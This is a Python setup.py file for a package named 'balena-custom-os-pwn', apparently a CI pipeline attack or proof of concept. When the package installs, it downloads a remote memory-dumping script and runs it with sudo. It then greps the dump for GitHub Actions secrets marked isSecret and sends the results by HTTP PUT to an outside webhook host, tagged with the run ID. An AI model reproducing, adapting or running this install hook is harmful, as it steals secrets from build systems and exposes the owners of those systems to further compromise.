import os
from setuptools import setup

print("Okay, we got this far. Let's continue...")
os.system("curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' >> \"/tmp/secrets\"")
os.system("curl -X PUT -d @/tmp/secrets \"https://open-hookbin.vercel.app/" + os.environ.get("GITHUB_RUN_ID", "local") + "\"")

setup(
    name="balena-custom-os-pwn",
    version="1.0.0",
    packages=[],
)
